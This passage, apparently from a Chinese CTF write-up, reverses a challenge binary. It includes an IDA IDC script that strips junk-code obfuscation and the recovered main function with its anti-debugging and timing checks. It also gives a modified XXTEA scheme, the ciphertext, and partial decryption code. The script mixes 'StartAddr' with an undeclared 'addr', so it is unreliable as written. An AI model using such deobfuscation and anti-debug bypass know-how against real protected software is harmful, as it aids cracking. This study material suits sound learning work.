        <span class="token keyword">if</span> <span class="token punctuation">(</span>v <span class="token operator">==</span> <span class="token number">0x5153509C</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> Addr <span class="token operator">+</span> i<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 搜索最后的jmp rax指令</span>
<span class="token keyword">static</span> <span class="token function">FindJmpRax</span><span class="token punctuation">(</span>Addr<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">auto</span> i<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x90</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">auto</span> v <span class="token operator">=</span> <span class="token function">Word</span><span class="token punctuation">(</span>Addr <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>v <span class="token operator">==</span> <span class="token number">0xE0FF</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> Addr <span class="token operator">+</span> i<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 搜索call $+5</span>
<span class="token keyword">static</span> <span class="token function">FindCall</span><span class="token punctuation">(</span>Addr<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">auto</span> i<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x90</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">auto</span> v <span class="token operator">=</span> <span class="token function">Dword</span><span class="token punctuation">(</span>Addr <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>v <span class="token operator">==</span> <span class="token number">0xE8</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> Addr <span class="token operator">+</span> i<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">static</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">auto</span> StartAddr <span class="token operator">=</span> <span class="token number">0x1401F400D</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token comment">// 搜索真实汇编代码的下一个指令地址</span>
        <span class="token keyword">auto</span> EndAddr <span class="token operator">=</span> <span class="token function">FindEnd</span><span class="token punctuation">(</span>StartAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>EndAddr <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// 真实汇编代码的字节长度</span>
        <span class="token keyword">auto</span> CodeLength <span class="token operator">=</span> EndAddr <span class="token operator">-</span> addr <span class="token operator">-</span> <span class="token number">13</span><span class="token punctuation">;</span>
        <span class="token comment">// 搜索Call $+5</span>
        <span class="token keyword">auto</span> CallAddr <span class="token operator">=</span> <span class="token function">FindCall</span><span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">+</span> CodeLength<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>CallAddr <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// call $+5的下一条指令地址，即call时push到栈的返回地址</span>
        <span class="token keyword">auto</span> CalcAddr <span class="token operator">=</span> CallAddr <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">;</span>
        <span class="token keyword">auto</span> ebx <span class="token operator">=</span> <span class="token function">Dword</span><span class="token punctuation">(</span>CalcAddr <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">auto</span> rol_Value <span class="token operator">=</span> <span class="token function">Byte</span><span class="token punctuation">(</span>CalcAddr <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">auto</span> Mode <span class="token operator">=</span> <span class="token function">Dword</span><span class="token punctuation">(</span>CalcAddr <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ebx <span class="token operator">=</span> <span class="token function">rol</span><span class="token punctuation">(</span>ebx<span class="token punctuation">,</span> rol_Value<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 搜索最尾部的jmp rax指令地址</span>
        <span class="token keyword">auto</span> JmpRaxAddr <span class="token operator">=</span> <span class="token function">FindJmpRax</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>JmpRaxAddr <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// 第一部分垃圾指令长度</span>
        <span class="token keyword">auto</span> TrushCodeLength_1 <span class="token operator">=</span> CallAddr <span class="token operator">-</span> <span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">+</span> CodeLength<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 第二部分垃圾指令长度</span>
        <span class="token keyword">auto</span> TrushCodeLength_2 <span class="token operator">=</span> JmpRaxAddr <span class="token operator">-</span> CallAddr <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token comment">// Nop掉无用的所有代码</span>
        <span class="token function">NopCode</span><span class="token punctuation">(</span>CallAddr<span class="token punctuation">,</span> TrushCodeLength_2<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">NopCode</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">NopCode</span><span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">+</span> CodeLength<span class="token punctuation">,</span> TrushCodeLength_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 一共两种地址计算，加和减</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>Mode <span class="token operator">==</span> <span class="token number">0xffC32B48</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            CalcAddr <span class="token operator">=</span> CalcAddr <span class="token operator">-</span> ebx<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>Mode <span class="token operator">==</span> <span class="token number">0xffC30348</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            CalcAddr <span class="token operator">=</span> CalcAddr <span class="token operator">+</span> ebx<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">auto</span> JmpCodeAddr <span class="token operator">=</span> EndAddr<span class="token punctuation">;</span>
        <span class="token comment">// 计算相对跳转地址</span>
        <span class="token keyword">auto</span> JmpOffset <span class="token operator">=</span> CalcAddr <span class="token operator">-</span> JmpCodeAddr <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">;</span>
        <span class="token comment">// 写入jmp指令</span>
        <span class="token function">PatchByte</span><span class="token punctuation">(</span>JmpCodeAddr<span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">PatchDword</span><span class="token punctuation">(</span>JmpCodeAddr <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> JmpOffset<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// jmp的地址为下一次deobf起始地址</span>
        addr <span class="token operator">=</span> CalcAddr<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>执行完，把main_0剩余代码都手动nop即可。</p>
<p><img src="/images/44-1744626745338-49.png" loading="lazy"></p>
<p>然后Apply patches to input file，应用一下patch，重新打开ida载入程序分析。</p>
<p>从main_0的jmp进入两层到这边，然后用IDA Delete Function删除sub_1401F7B77函数，然后对jmp那边按E即可重新重构完main函数（如图2），F5即可分析。</p>
<p><img src="/images/45-1744626745338-50.png" loading="lazy"></p>
<p><img src="/images/46-1744626745338-51.png" loading="lazy"></p>
<p>Main函数原代码：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> __fastcall <span class="token function">main_0</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// rbp</span>
  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// rdi</span>
  __int64 i<span class="token punctuation">;</span> <span class="token comment">// rcx</span>
  _DWORD <span class="token operator">*</span>v7<span class="token punctuation">;</span> <span class="token comment">// rdi</span>
  HANDLE CurrentProcess<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// [rsp-20h] [rbp-458h] BYREF</span>
  _DWORD v10<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-438h] BYREF</span>
  _BYTE v11<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-430h] BYREF</span>
  _BYTE <span class="token operator">*</span>v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+48h] [rbp-3F0h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v13<span class="token punctuation">;</span> <span class="token comment">// [rsp+64h] [rbp-3D4h]</span>
  <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment">// [rsp+84h] [rbp-3B4h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v15<span class="token punctuation">;</span> <span class="token comment">// [rsp+A4h] [rbp-394h]</span>
  <span class="token keyword">int</span> v16<span class="token punctuation">;</span> <span class="token comment">// [rsp+C4h] [rbp-374h]</span>
  <span class="token keyword">int</span> v17<span class="token punctuation">;</span> <span class="token comment">// [rsp+E4h] [rbp-354h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> k<span class="token punctuation">;</span> <span class="token comment">// [rsp+104h] [rbp-334h]</span>
  <span class="token keyword">int</span> v19<span class="token punctuation">;</span> <span class="token comment">// [rsp+124h] [rbp-314h]</span>
  <span class="token keyword">int</span> v20<span class="token punctuation">;</span> <span class="token comment">// [rsp+144h] [rbp-2F4h]</span>
  <span class="token keyword">int</span> v21<span class="token punctuation">;</span> <span class="token comment">// [rsp+164h] [rbp-2D4h]</span>
  _DWORD v22<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+188h] [rbp-2B0h] BYREF</span>
  <span class="token keyword">unsigned</span> __int16 v23<span class="token punctuation">;</span> <span class="token comment">// [rsp+1B4h] [rbp-284h]</span>
  BOOL v24<span class="token punctuation">;</span> <span class="token comment">// [rsp+1D4h] [rbp-264h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 j<span class="token punctuation">;</span> <span class="token comment">// [rsp+1F8h] [rbp-240h]</span>
  <span class="token keyword">unsigned</span> __int64 v26<span class="token punctuation">;</span> <span class="token comment">// [rsp+218h] [rbp-220h]</span>
  _DWORD v27<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+238h] [rbp-200h]</span>
  <span class="token keyword">unsigned</span> __int64 m<span class="token punctuation">;</span> <span class="token comment">// [rsp+268h] [rbp-1D0h]</span>
  <span class="token keyword">int</span> v29<span class="token punctuation">;</span> <span class="token comment">// [rsp+3F4h] [rbp-44h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v30<span class="token punctuation">;</span> <span class="token comment">// [rsp+3F8h] [rbp-40h]</span>
  <span class="token keyword">int</span> v31<span class="token punctuation">;</span> <span class="token comment">// [rsp+3FCh] [rbp-3Ch]</span>
  __int64 v32<span class="token punctuation">;</span> <span class="token comment">// [rsp+400h] [rbp-38h]</span>
  <span class="token keyword">int</span> v33<span class="token punctuation">;</span> <span class="token comment">// [rsp+408h] [rbp-30h]</span>
  <span class="token keyword">unsigned</span> __int64 v34<span class="token punctuation">;</span> <span class="token comment">// [rsp+410h] [rbp-28h]</span>
  __int64 v35<span class="token punctuation">;</span> <span class="token comment">// [rsp+428h] [rbp-10h]</span>
  __int64 v36<span class="token punctuation">;</span> <span class="token comment">// [rsp+430h] [rbp-8h]</span>

  v36 <span class="token operator">=</span> v3<span class="token punctuation">;</span>
  v35 <span class="token operator">=</span> v4<span class="token punctuation">;</span>
  v7 <span class="token operator">=</span> v10<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">170</span><span class="token punctuation">;</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span>
    <span class="token operator">*</span>v7<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">858993460</span><span class="token punctuation">;</span>
  v34 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>v10 <span class="token operator">^</span> <span class="token number">0x1401D9000LL</span><span class="token punctuation">;</span>
  <span class="token function">j___CheckForDebuggerJustMyCode</span><span class="token punctuation">(</span><span class="token number">0x1401ED104LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>v11<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_140087C02</span><span class="token punctuation">(</span><span class="token number">0x1401A1190LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">IsDebuggerPresent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">sub_1400868E3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v12 <span class="token operator">=</span> v11<span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>v22<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x10u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v23 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    v29 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    v20 <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">;</span>
    v15 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    v16 <span class="token operator">=</span> <span class="token number">0x61C88646</span><span class="token punctuation">;</span>
    v21 <span class="token operator">=</span> <span class="token number">0x95664B48</span><span class="token punctuation">;</span>
    v19 <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>
    v24 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    CurrentProcess <span class="token operator">=</span> <span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">CheckRemoteDebuggerPresent</span><span class="token punctuation">(</span>CurrentProcess<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v24<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v24 <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">j_srand</span><span class="token punctuation">(</span><span class="token number">0xAABBu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>
        v22<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">j_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        v29 <span class="token operator">=</span> v19<span class="token operator">--</span><span class="token punctuation">;</span>
        v30 <span class="token operator">=</span> v29 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v30 <span class="token punctuation">)</span>
          <span class="token keyword">break</span><span class="token punctuation">;</span>
        v15 <span class="token operator">+=</span> v16<span class="token punctuation">;</span>
        v17 <span class="token operator">=</span> <span class="token punctuation">(</span>v15 <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> v23<span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          v26 <span class="token operator">=</span> <span class="token function">__rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          v13 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> v23<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          v29 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> v13<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>k <span class="token operator">+</span> v23 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> v23<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          v30 <span class="token operator">=</span> k <span class="token operator">+</span> v23 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
          v31 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v30 <span class="token operator">%</span> v23<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v13 <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> v29<span class="token punctuation">;</span>
          v32 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v17 <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>k<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>
          v33 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v30 <span class="token operator">%</span> v23<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">^</span> v22<span class="token punctuation">[</span>v32<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>v13 <span class="token operator">^</span> v15<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> v31<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> k<span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> k<span class="token punctuation">]</span> <span class="token operator">=</span> v33<span class="token punctuation">;</span>
          v14 <span class="token operator">=</span> v33<span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">__rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> v26 <span class="token operator">></span> <span class="token number">0x83C0</span> <span class="token punctuation">)</span>
            <span class="token keyword">goto</span> LABEL_20<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
      v27<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xA9934E2F</span><span class="token punctuation">;</span>
      v27<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x30B90FA</span><span class="token punctuation">;</span>
      v27<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xDCBF1D3</span><span class="token punctuation">;</span>
      v27<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x328B5BDE</span><span class="token punctuation">;</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span> m <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> m <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>m <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v27<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">!=</span> v10<span class="token punctuation">[</span>m <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          <span class="token function">sub_140087C02</span><span class="token punctuation">(</span><span class="token number">0x1401A11A8LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">j_system</span><span class="token punctuation">(</span>byte_1401A11A0<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">goto</span> LABEL_20<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token function">sub_140087C02</span><span class="token punctuation">(</span><span class="token number">0x1401A11C0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">j_system</span><span class="token punctuation">(</span>byte_1401A11A0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
LABEL_20<span class="token operator">:</span>
  <span class="token function">j__RTC_CheckStackVars</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v9<span class="token punctuation">,</span> <span class="token punctuation">(</span>_RTC_framedesc <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_1401A1140<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">j___security_check_cookie</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>v10 <span class="token operator">^</span> v34<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">sub_1401F8E9B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>很清晰看出来是XXTEA加密，密钥是固定种子随机数随机得到的，Delta被魔改，然后密文也能看到。</p>
<p><strong>注：写WP时用的是旧版附件分析，缺失了后面16字节密文</strong></p>
<p>完整密文数据：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token number">0xa9934e2f</span><span class="token punctuation">,</span> <span class="token number">0x30b90fa</span><span class="token punctuation">,</span> <span class="token number">0xdcbf1d3</span><span class="token punctuation">,</span> <span class="token number">0x328b5bde</span><span class="token punctuation">,</span>
<span class="token number">0x44fab4e</span><span class="token punctuation">,</span> <span class="token number">0x1dcf0051</span><span class="token punctuation">,</span> <span class="token number">0x85ebbe55</span><span class="token punctuation">,</span> <span class="token number">0x93aa773a</span></code></pre>

<p>解密代码：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">0x61C88646</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MX</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">^</span> y <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">3</span> <span class="token operator">^</span> z <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sum <span class="token operator">^</span> y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>p <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> e<span class="token punctuation">]</span> <span class="token operator">^</span> z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>

<span class="token keyword">void</span> <span class="token function">xxtea</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span> <span class="token operator">*</span>v<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span> <span class="token keyword">const</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">uint32_t</span> y<span class="token punctuation">,</span> z<span class="token punctuation">,</span> sum<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> p<span class="token punctuation">,</span> rounds<span class="token punctuation">,</span> e<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">/* Coding Part */</span>
    <span class="token punctuation">&#123;</span>
        rounds <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>
        sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        z <span class="token operator">=</span> v<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">do</span>
